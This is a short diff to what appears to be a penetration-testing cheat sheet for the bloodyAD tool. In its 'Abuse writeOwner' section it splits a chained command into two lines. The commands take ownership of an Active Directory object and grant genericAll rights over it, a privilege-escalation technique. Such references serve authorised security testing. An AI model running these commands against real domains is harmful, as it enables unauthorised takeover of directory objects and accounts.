@@ -58,5 +58,6 @@ bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add dnsRecord <record_n
 
 ## Abuse writeOwner
 ```
-bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <trustee>; bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <trustee>
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <trustee>
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <trustee>
 ```
